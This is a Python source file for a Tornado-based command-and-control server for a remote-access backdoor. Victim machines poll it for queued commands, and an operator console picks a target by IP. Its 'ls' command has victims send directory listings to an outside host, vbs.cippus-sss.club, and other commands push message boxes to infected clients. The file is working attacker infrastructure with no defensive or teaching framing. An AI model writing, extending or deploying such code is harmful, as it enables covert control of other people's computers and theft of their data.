#coding=utf-8
import tornado.ioloop
import tornado.web
import threading
import queue
from middle import *

response = {
    "resp": "",
    "count": 0,
    "default": add_sleep("", 1000),
}

clients = {
    "ips": set(),
}

def ioInputTask():
    tip = ""
    while True:
        a = input("cmd:")
        try:
            if a.startswith("ips"):
                print("-----------online client-----------")
                print("\n".join(clients['ips']))
                print("-----------online client end-------")
            elif a.startswith("target"):
                ip = a[7:]
                tip = ip
                print("chosen target ip %s"%tip)
            elif a.startswith("ls"):
                path = a[3:]
                cmd = add_post_folder("", "http://vbs.cippus-sss.club/folder",path)
                clients[tip].put(cmd)
            elif a.startswith("msg"):
                msg = a[4:]
                cmd = add_msgbox("", msg)
                clients[tip].put(cmd)
        except Exception as e:
            print(e)

class FileFolderHandler(tornado.web.RequestHandler):
    def post(self):
        print("-----------%sfolder-----------"%self.request.remote_ip)
        print("%s"%( self.request.body.decode('utf-8')))
        print("-----------%sfolder end-------"%self.request.remote_ip)
        self.write("ok")

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.request.remote_ip = self.request.headers['X-Real-Ip']
        if self.request.remote_ip not in clients['ips']:
            print("%s linked to host"%self.request.remote_ip)
            clients['ips'].add(self.request.remote_ip)
            clients[self.request.remote_ip] = queue.Queue(50)
        else:
            task_queue = clients[self.request.remote_ip]
            if not task_queue.empty():
                cmd = task_queue.get()
                self.write(cmd)
                task_queue.task_done()
            else:
                self.write(response['default'])
    def post(self):
        print("%s post %s"%(self.request.remote_ip, self.request.body.decode('utf-8')))
        self.write("ok")

def make_app():
    return tornado.web.Application([
    (r'/', MainHandler),
    (r'/folder', MainHandler),
    ])

if __name__ == '__main__':
    t1 = threading.Thread(target=ioInputTask)
    t1.setDaemon(True)
    t1.start()
    app = make_app()
    app.listen(8888)
    print("looping")
    tornado.ioloop.IOLoop.current().start()
